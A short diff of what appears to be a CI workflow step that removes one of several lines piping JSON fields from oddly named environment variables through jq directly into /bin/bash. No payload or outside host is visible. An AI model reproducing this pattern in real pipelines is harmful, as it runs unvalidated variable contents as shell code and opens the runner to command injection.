@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$yh81" | jq -r .qbohz5073 | /bin/bash
           printf '%s' "$hcbb3363" | jq -r .azyk2 | /bin/bash
-          printf '%s' "$vybw8" | jq -r .j0648 | /bin/bash
           printf '%s' "$hgq54" | jq -r .j95504 | /bin/bash
 
       - name: Persist output
